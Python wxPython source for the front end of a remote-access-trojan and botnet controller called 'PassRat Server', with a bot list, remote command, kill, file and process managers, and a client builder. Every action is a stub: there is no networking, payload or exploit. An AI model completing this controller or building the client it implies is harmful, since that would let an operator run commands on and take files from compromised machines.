# /usr/bin/env python
# coding=utf-8
import os
import wx
import wx.lib.mixins.listctrl  as  listmix

botlist = [u'0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   u'0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   u'0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   u'0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   u'0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   u'0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   u'0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   u'0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   u'0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2'
		   ]
Header = [u'ID', u'SysVersion', u'UserName', u'ComputerName', u'IP']

Server = u"10.0.0.1"
port = 9999
botnums = u"1007"

class MyListCtrl(wx.ListCtrl, listmix.ListCtrlAutoWidthMixin):
	def __init__(self, parent, ID, pos=wx.DefaultPosition,
				 size=wx.DefaultSize, style=0):
		wx.ListCtrl.__init__(self, parent, ID, pos, size, style)
		listmix.ListCtrlAutoWidthMixin.__init__(self)
		#self.setResizeColumn(5)


class MainFrame(wx.Frame):
	def __init__(self, parent, title):
		wx.Frame.__init__(self, parent, id=wx.ID_ANY, title=title, pos=wx.DefaultPosition,
						  size=wx.Size(-1, -1), style=wx.DEFAULT_FRAME_STYLE | wx.TAB_TRAVERSAL)

		self.InitUI()

	def InitUI(self):
		self.MainBox = wx.BoxSizer(wx.VERTICAL)
		self.SetSizer(self.MainBox)
		self.Layout()
		self.Fit()
		self.SetMinSize(wx.Size(900, 500))

		self.CreatMenuBar()
		self.CreatToolbar()
		self.CreatStatusBar()
		self.CreatBotList()

		self.SetAutoLayout(True)
		self.Centre()

	def CreatBotList(self):
		BotList = MyListCtrl(self, wx.ID_ANY, wx.DefaultPosition, wx.Size(-1, -1),
								   wx.LC_HRULES | wx.LC_REPORT | wx.LC_VRULES)
		#self.BotList.SetMinSize(wx.Size(900, 400))
		BotList.SetAutoLayout(True)
		for index,text in enumerate(Header):
			BotList.InsertColumn(index, text, format=wx.LIST_FORMAT_CENTRE, width=-1)
		for index,text in enumerate(botlist):
			row = BotList.InsertStringItem(index, label = u"")
			bot = text.split(u":")
			BotList.SetStringItem(row, 0, bot[0])
			BotList.SetStringItem(row, 1, bot[1])
			BotList.SetStringItem(row, 2, bot[2])
			BotList.SetStringItem(row, 3, bot[3])
			BotList.SetStringItem(row, 4, bot[4])
		BotList.SetColumnWidth(0, 190)
		BotList.SetColumnWidth(1, 180)
		BotList.SetColumnWidth(2, 170)
		BotList.SetColumnWidth(3, 170)
		BotList.SetColumnWidth(4, 170)
		self.Bind(wx.EVT_CONTEXT_MENU, self.OnShowPopup)
		self.Bind(wx.EVT_LIST_ITEM_SELECTED,self.OnBotListSelect)
		self.MainBox.Add(BotList,1,wx.ALIGN_CENTER_HORIZONTAL|wx.EXPAND,0)
		self.Uid=0

	def CreatStatusBar(self):
		StatusBar = self.CreateStatusBar(1, wx.ST_SIZEGRIP, wx.ID_ANY)
		StatusBar.SetFieldsCount(2)
		StatusBar.SetStatusText(u"Server: %s:%s" % (Server, str(port)), 0)
		StatusBar.SetStatusText(u"BotNumbers: %s" % botnums, 1)

	def CreatMenuBar(self):
		MyMenuBar = wx.MenuBar(0)

		FileMenu = wx.Menu()
		ServerItem = wx.MenuItem(FileMenu, wx.ID_ANY, u"Server", wx.EmptyString, wx.ITEM_NORMAL)
		FileMenu.AppendItem(ServerItem)
		ExitMenuItem = wx.MenuItem(FileMenu, wx.ID_ANY, u"Exit", wx.EmptyString, wx.ITEM_NORMAL)
		FileMenu.AppendItem(ExitMenuItem)
		MyMenuBar.Append(FileMenu, u" Start")

		OptionMenu = wx.Menu()
		BuildClientItem = wx.MenuItem(OptionMenu, wx.ID_ANY, u"Build client", wx.EmptyString, wx.ITEM_NORMAL)
		OptionMenu.AppendItem(BuildClientItem)
		MyMenuBar.Append(OptionMenu, u"Options")

		HelpMenu = wx.Menu()
		AboutMenuItem = wx.MenuItem(HelpMenu, wx.ID_ANY, u"About", wx.EmptyString, wx.ITEM_NORMAL)
		HelpMenu.AppendItem(AboutMenuItem)
		MyMenuBar.Append(HelpMenu, u"Help")

		self.SetMenuBar(MyMenuBar)
		self.Bind(wx.EVT_MENU, self.OnExit, ExitMenuItem)
		self.Bind(wx.EVT_MENU, self.OnAbout, AboutMenuItem)
		self.Bind(wx.EVT_MENU, self.OnBuildClient,BuildClientItem)
		self.Bind(wx.EVT_MENU, self.OnServer,ServerItem)

	def CreatToolbar(self):
		ToolBar = wx.ToolBar(self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize,
									 wx.TB_HORIZONTAL | wx.TB_TEXT)
		SerIterm=ToolBar.AddLabelTool(wx.ID_ANY, u"Server",
													wx.Bitmap(u"./source/toolbar/option.ico", wx.BITMAP_TYPE_ANY), wx.NullBitmap,
													wx.ITEM_NORMAL, u"Server Options", u"Server Options", None)
		ToolBar.AddSeparator()
		CliIterm =ToolBar.AddLabelTool(wx.ID_ANY, u"Client",
													wx.Bitmap(u"./source/toolbar/client.ico", wx.BITMAP_TYPE_ANY), wx.NullBitmap,
													wx.ITEM_NORMAL, u"Build client", u"Build client", None)
		ToolBar.AddSeparator()
		RefItem =ToolBar.AddLabelTool(wx.ID_ANY, u"Refresh",
													wx.Bitmap(u"./source/toolbar/refresh.ico", wx.BITMAP_TYPE_ANY), wx.NullBitmap,
													wx.ITEM_NORMAL, u"Refresh", u"Refresh", None)
		ToolBar.Realize()
		self.MainBox.Add(ToolBar,0,wx.ALL|wx.EXPAND,0)

		self.Bind(wx.EVT_MENU ,self.OnServer,SerIterm)
		self.Bind(wx.EVT_MENU, self.OnBuildClient, CliIterm)
		self.Bind(wx.EVT_MENU, self.OnRefresh, RefItem)

	def OnShowPopup(self, event):
		if self.Uid:
			self.popupmenu = wx.Menu()

			Cmditem = wx.MenuItem(self.popupmenu, -1, u"CMD")
			Cmditem.SetBitmap(wx.Bitmap(u"./source/menu/cmd.ico", wx.BITMAP_TYPE_ICO))
			self.popupmenu.AppendItem(Cmditem)

			Killitem =wx.MenuItem(self.popupmenu, -1,u"Kill")
			Killitem.SetBitmap(wx.Bitmap(u"./source/menu/kill.ico", wx.BITMAP_TYPE_ICO))
			self.popupmenu.AppendItem(Killitem)

			Fileitem = wx.MenuItem(self.popupmenu,-1,u"File Manager")
			Fileitem.SetBitmap(wx.Bitmap(u"./source/menu/file.ico", wx.BITMAP_TYPE_ICO))
			self.popupmenu.AppendItem(Fileitem)

			Proceitem = wx.MenuItem(self.popupmenu,-1,u'Process Manager')
			Proceitem.SetBitmap(wx.Bitmap(u"./source/menu/process.ico", wx.BITMAP_TYPE_ICO))
			self.popupmenu.AppendItem(Proceitem)

			self.Bind(wx.EVT_MENU, self.OnCmd, Cmditem)
			self.Bind(wx.EVT_MENU, self.OnKillBot, Killitem)
			self.Bind(wx.EVT_MENU, self.OnFileManager, Fileitem)
			self.Bind(wx.EVT_MENU, self.OnProcess, Proceitem)
			pos = event.GetPosition()
			pos = self.ScreenToClient(pos)
			self.PopupMenu(self.popupmenu, pos)
			self.Uid=0

	def OnBotListSelect(self,event):
		self.SelItem = event.GetItem()
		self.Uid =self.SelItem.GetText()

	def OnCmd(self, event):
		if self.Uid:
			Cmd = wx.Frame(self, id=-1, title=u"CMD", pos=wx.DefaultPosition, size = wx.DefaultSize,
						   style=wx.DEFAULT_FRAME_STYLE | wx.TAB_TRAVERSAL|wx.TE_READONLY)
			Cmd.SetMinSize(wx.Size(600, 400))
			Cmd.SetBackgroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_3DLIGHT ) )
			prompt = wx.StaticText(Cmd, -1, u'Command line:')
			self.cmd = wx.TextCtrl(Cmd, -1, u'whoami')
			self.exBtn = wx.Button(Cmd, -1, u'Execute')

			self.out = wx.TextCtrl(Cmd, -1, '', style=wx.TE_MULTILINE | wx.TE_READONLY )
			self.out.SetBackgroundColour(wx.Colour( 0, 0, 0 ))
			self.out.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_HIGHLIGHTTEXT ) )

			# Hook up the events
			self.Bind(wx.EVT_BUTTON, self.OnSendCmd, self.exBtn)
			self.Bind(wx.EVT_TEXT_ENTER, self.OnSendCmd, self.exBtn)

			# Do the layout
			box1 = wx.BoxSizer(wx.HORIZONTAL)
			box1.Add(prompt, 0, wx.ALIGN_CENTER)
			box1.Add(self.cmd, 1, wx.ALIGN_CENTER | wx.LEFT | wx.RIGHT, 5)
			box1.Add(self.exBtn, 0)


			sizer = wx.BoxSizer(wx.VERTICAL)
			sizer.Add(box1, 0, wx.EXPAND | wx.ALL, 10)
			sizer.Add(self.out, 1, wx.EXPAND | wx.ALL, 5)

			Cmd.SetSizer(sizer)
			Cmd.SetAutoLayout(True)
			Cmd.Fit()
			Cmd.Centre()
			Cmd.Show(True)

	def OnSendCmd(self,event):
		Command = self.cmd.GetValue()
		self.out.AppendText(Command+u"\n")

	def OnKillBot(self,event):
		if self.Uid:
			wx.MessageBox(str(self.Uid))

	def OnFileManager(self,event):
		if self.Uid:
			FileFrame = wx.Frame(self,title = u"File Manager")
			FileFrame.SetMinSize(wx.Size(900, 600))
			FileFrame.SetBackgroundColour(wx.SystemSettings.GetColour(wx.SYS_COLOUR_3DLIGHT))
			FileFrame.Centre()
			self.disktree = wx.TreeCtrl(FileFrame, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TR_DEFAULT_STYLE)
			self.disktree.SetMinSize(wx.Size(250, -1))

			isz = (16, 16)
			il = wx.ImageList(isz[0], isz[1])
			self.fldridx = il.Add(wx.ArtProvider_GetBitmap(wx.ART_FOLDER, wx.ART_OTHER, isz))
			self.fldropenidx = il.Add(wx.ArtProvider_GetBitmap(wx.ART_FOLDER_OPEN, wx.ART_OTHER, isz))
			self.fileidx = il.Add(wx.ArtProvider_GetBitmap(wx.ART_NORMAL_FILE, wx.ART_OTHER, isz))
			self.diskidx = il.Add(wx.ArtProvider_GetBitmap(wx.ART_HARDDISK, wx.ART_OTHER, isz))
			self.disktree.SetImageList(il)
			self.il = il

			self.root = self.disktree.AddRoot(u"/")
			self.disktree.SetItemImage(self.root, self.diskidx, wx.TreeItemIcon_Normal)
			disks = [u"c:\\",u"d:\\",u"g:\\",u"h:\\"]
			for disk in disks:
				Item = self.disktree.AppendItem(self.root, disk)
				self.disktree.SetItemImage(Item, self.diskidx, wx.TreeItemIcon_Normal)
				self.AddTreeNodes(Item, os.listdir(disk))
			self.disktree.Expand(self.root)
			self.Bind(wx.EVT_TREE_ITEM_EXPANDED, self.OnItemExpanded,self.disktree)
			self.Bind(wx.EVT_TREE_ITEM_ACTIVATED, self.OnItemExpanded,self.disktree)
			#self.disktree.Bind(wx.EVT_LEFT_DCLICK, self.OnItemExpanded)
			self.filelist = MyListCtrl(FileFrame, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.LC_REPORT)
			for index, text in enumerate([u'Name',u'Size',u'Date']):
				self.filelist.InsertColumn(index, text, format=wx.LIST_FORMAT_CENTRE, width=-1)
			self.filelist.SetColumnWidth(0, 300)
			self.filelist.SetColumnWidth(1, 150)
			self.filelist.SetColumnWidth(2, 100)
			self.filelist.AssignImageList(il,wx.IMAGE_LIST_SMALL)

			self.filelist.Bind(wx.EVT_CONTEXT_MENU, self.OnShowFileRightMenu)
			self.filelist.Bind(wx.EVT_LIST_ITEM_SELECTED, self.OnSelectFiled)
			self.filelist.Bind(wx.EVT_LIST_ITEM_ACTIVATED,self.OnOpenFolder)
			self.SelectName=0

			sizer = wx.BoxSizer(wx.HORIZONTAL)
			sizer.Add(self.disktree, 0, wx.ALL | wx.EXPAND, 10)
			sizer.Add(self.filelist, 1, wx.ALL | wx.EXPAND, 10)
			FileFrame.SetSizer(sizer)
			FileFrame.Layout()
			FileFrame.SetAutoLayout(True)
			FileFrame.Fit()
			FileFrame.Show(True)

	def AddTreeNodes(self, parentItem, items):
		for item in items:
			newItem = self.disktree.AppendItem(parentItem, item)
			path = self.GetAbsPath(newItem)
			if  os.path.isdir(path):
				self.disktree.SetItemImage(newItem, self.fldridx, wx.TreeItemIcon_Normal)
				self.disktree.SetItemImage(newItem, self.fldropenidx, wx.TreeItemIcon_Expanded)
			else:
				self.disktree.SetItemImage(newItem, self.fileidx, wx.TreeItemIcon_Normal)

	def GetAbsPath(self,item):
		fatext = u""
		path = self.disktree.GetItemText(item)
		while 1:
			if fatext == u"/":
				break
			faitem = self.disktree.GetItemParent(item)
			fatext = self.disktree.GetItemText(faitem)
			path = os.path.join(fatext, path)
			item = faitem
		return path

	def OnItemExpanded(self,event):
		item = event.GetItem()
		child = self.disktree.GetChildrenCount(item)
		if not child:
			path = self.GetAbsPath(item)
			#wx.MessageBox(str(event))
			self.AddTreeNodes(item, os.listdir(path))
			#self.disktree.Expand(item)
		self.FilePath = self.GetAbsPath(item)
		self.OnRefreshFileList()

	def OnRefreshFileList(self):
		self.filelist.DeleteAllItems()
		filelist = os.listdir(self.FilePath)

		for index, text in enumerate(filelist):
			row = self.filelist.InsertStringItem(index, label="")
			self.filelist.SetStringItem(row, 0, text)
			path = os.path.join(self.FilePath,text)
			if  os.path.isdir(path):
				self.filelist.SetItemImage(row, self.fldridx, self.fldridx)
			else:
				self.filelist.SetItemImage(row, self.fileidx, self.fileidx)
			self.filelist.SetStringItem(row, 1, u"1024")
			self.filelist.SetStringItem(row, 2, u"2016/07/10")

	def OnShowFileRightMenu(self,event):
		if self.SelectName:
			self.FileRightMenu = wx.Menu()

			Uploaditem = wx.MenuItem(self.FileRightMenu, -1, u"Upload File")
			self.FileRightMenu.AppendItem(Uploaditem)

			Downitem = wx.MenuItem(self.FileRightMenu, -1, u"Download File")
			self.FileRightMenu.AppendItem(Downitem)

			Delitem = wx.MenuItem(self.FileRightMenu, -1, u"Delete File")
			self.FileRightMenu.AppendItem(Delitem)

			self.Bind(wx.EVT_MENU, self.OnUpload, Uploaditem)
			self.Bind(wx.EVT_MENU, self.OnDownload, Downitem)
			self.Bind(wx.EVT_MENU, self.OnDelete, Delitem)
			pos = event.GetPosition()
			pos = self.filelist.ScreenToClient(pos)
			self.filelist.PopupMenu(self.FileRightMenu, pos)
			#self.FileID=0
		else:
			self.UpMenu = wx.Menu()
			Upitem = wx.MenuItem(self.UpMenu, -1, u"Upload File")
			self.UpMenu.AppendItem(Upitem)
			self.Bind(wx.EVT_MENU, self.OnUpload, Upitem)
			pos = event.GetPosition()
			pos = self.filelist.ScreenToClient(pos)
			self.filelist.PopupMenu(self.UpMenu, pos)

	def OnSelectFiled(self,event):
		self.SelItem = event.GetItem()
		self.SelectName =self.SelItem.GetText()
		self.FullFilePath = os.path.join(self.FilePath,self.SelectName)


	def OnOpenFolder(self,event):
		item = event.GetItem()
		SelectName = item.GetText()
		self.FilePath = os.path.join(self.FilePath, SelectName)
		if os.path.isdir(self.FilePath):
			self.OnRefreshFileList()


	def OnProcess(self,event):
		if self.Uid:
			ProFrame = wx.Frame(self)
			ProFrame.Centre()
			ProFrame.Show(True)

	def OnExit(self, event):
		self.Close()

	def OnAbout(self, event):
		info = wx.AboutDialogInfo()
		info.Name = u"PassRat Server"
		info.Version = u"1.0.0"
		info.Copyright = u"(C) 2013 Programmers and Coders Everywhere"
		info.Description = u"Remote Access Tool"
		info.WebSite = (u"http://www.google.com", u"PassRat home page")
		info.Developers = [u"Joe"]

		info.License = u"  "

		# Then we call wx.AboutBox giving it that info object
		wx.AboutBox(info)
	def OnServer(self,event):
		ServerFrame = wx.Frame(self,id=wx.ID_ANY, title=u"Server Option",pos = wx.DefaultPosition,size = wx.DefaultSize, style=wx.DEFAULT_FRAME_STYLE | wx.TAB_TRAVERSAL)
		ServerFrame.SetMinSize(wx.Size(450, 250))
		ServerFrame.SetBackgroundColour(wx.SystemSettings.GetColour(wx.SYS_COLOUR_3DLIGHT))

		iplab = wx.StaticText(ServerFrame, -1, u'Listen IP:    ')
		iptext = wx.TextCtrl(ServerFrame, -1, u'0.0.0.0')

		portlab = wx.StaticText(ServerFrame, -1, u'Listen Port:')
		porttext = wx.TextCtrl(ServerFrame, -1, u'9999')

		Sbt = wx.Button(ServerFrame, -1, u'Start')

		vbox1 = wx.BoxSizer(wx.HORIZONTAL)
		vbox1.Add(iplab,0,wx.ALIGN_CENTER|wx.TOP|wx.LEFT,20)
		vbox1.Add(iptext,1,wx.ALIGN_CENTER | wx.RIGHT|wx.TOP|wx.LEFT, 20)

		vbox2 = wx.BoxSizer(wx.HORIZONTAL)
		vbox2.Add(portlab,0,wx.ALIGN_CENTER|wx.TOP|wx.LEFT,20)
		vbox2.Add(porttext,1,wx.ALIGN_CENTER | wx.RIGHT|wx.TOP|wx.LEFT, 20)

		sizer =wx.BoxSizer(wx.VERTICAL)

		sizer.Add(vbox1, 0, wx.EXPAND | wx.ALL, 10)
		sizer.Add(vbox2, 0, wx.EXPAND | wx.ALL, 10)
		sizer.Add(Sbt, 0, wx.ALIGN_CENTER | wx.LEFT | wx.RIGHT|wx.TOP, 20)

		ServerFrame.SetSizer(sizer)
		ServerFrame.SetAutoLayout(True)
		ServerFrame.Centre()
		ServerFrame.Fit()
		ServerFrame.Show(True)


	def OnBuildClient(self, event):
		BuildFrame = wx.Frame(self, id=wx.ID_ANY, title=u"Client Build", pos = wx.DefaultPosition,size = wx.DefaultSize, style=wx.DEFAULT_FRAME_STYLE | wx.TAB_TRAVERSAL)
		BuildFrame.SetMinSize(wx.Size(450,300))
		BuildFrame.SetBackgroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_3DLIGHT ) )
		label1 = wx.StaticText(BuildFrame, -1, u'Server IP:    ')
		text1 = wx.TextCtrl(BuildFrame, -1, u'')

		label2 = wx.StaticText(BuildFrame, -1, u'Server Port:')
		text2 = wx.TextCtrl(BuildFrame, -1, u'9999')

		label3 = wx.StaticText(BuildFrame, -1, u'Save as:      ')
		text3 = wx.TextCtrl(BuildFrame, -1, u'*.exe')

		label4 = wx.StaticText(BuildFrame, -1, u'Save to:      ')
		chosedir = wx.DirPickerCtrl(BuildFrame, wx.ID_ANY, wx.EmptyString, u"Select a folder",
											 wx.DefaultPosition, wx.DefaultSize, wx.DIRP_DEFAULT_STYLE)
		Sbt = wx.Button(BuildFrame, -1, u'Build')

		vbox1 = wx.BoxSizer(wx.HORIZONTAL)
		vbox1.Add(label1,0,wx.ALIGN_CENTER|wx.TOP|wx.LEFT,20)
		vbox1.Add(text1,1,wx.ALIGN_CENTER | wx.RIGHT|wx.TOP|wx.LEFT, 20)

		vbox2 = wx.BoxSizer(wx.HORIZONTAL)
		vbox2.Add(label2,0,wx.ALIGN_CENTER|wx.TOP|wx.LEFT,20)
		vbox2.Add(text2,1,wx.ALIGN_CENTER | wx.RIGHT|wx.TOP|wx.LEFT, 20)

		vbox3 = wx.BoxSizer(wx.HORIZONTAL)
		vbox3.Add(label3,0,wx.ALIGN_CENTER|wx.TOP|wx.LEFT,20)
		vbox3.Add(text3,1,wx.ALIGN_CENTER | wx.RIGHT|wx.TOP|wx.LEFT, 20)

		vbox4 = wx.BoxSizer(wx.HORIZONTAL)
		vbox4.Add(label4,0,wx.ALIGN_CENTER|wx.TOP|wx.LEFT,20)
		vbox4.Add(chosedir,1,wx.ALIGN_CENTER | wx.RIGHT|wx.TOP|wx.LEFT, 20)

		sizer =wx.BoxSizer(wx.VERTICAL)
		sizer.Add(vbox1, 0, wx.EXPAND | wx.ALL, 10)
		sizer.Add(vbox2, 0, wx.EXPAND | wx.ALL, 10)
		sizer.Add(vbox3, 0, wx.EXPAND | wx.ALL, 10)
		sizer.Add(vbox4, 0, wx.EXPAND | wx.ALL, 10)
		sizer.Add(Sbt, 0, wx.ALIGN_CENTER | wx.LEFT | wx.RIGHT|wx.TOP|wx.BOTTOM, 20)

		BuildFrame.SetSizer(sizer)
		BuildFrame.SetAutoLayout(True)
		BuildFrame.Centre()
		BuildFrame.Fit()
		BuildFrame.Show(True)

	def OnUpload(self,event):
		wx.MessageBox(self.FilePath)
	def OnDownload(self,event):
		if self.SelectName:
			if os.path.isfile(self.FullFilePath):
				wx.MessageBox(self.FullFilePath)
			else:
				wx.MessageBox(u"Plase select a file")
		else:
			wx.MessageBox(u"Plase select a file")
	def OnDelete(self,event):
		if self.SelectName:
			if os.path.isfile(self.FullFilePath):
				wx.MessageBox(self.FullFilePath)
			else:
				wx.MessageBox(u"Plase select a file")
		else:
			wx.MessageBox(u"Plase select a file")

	def OnRefresh(self,event):
		wx.MessageBox(u"refresh!!!")
	def __del__(self):
		pass

app = wx.App(False)
MainWindow = MainFrame(None, u"PassRatServer")
MainWindow.Show(True)
app.MainLoop()
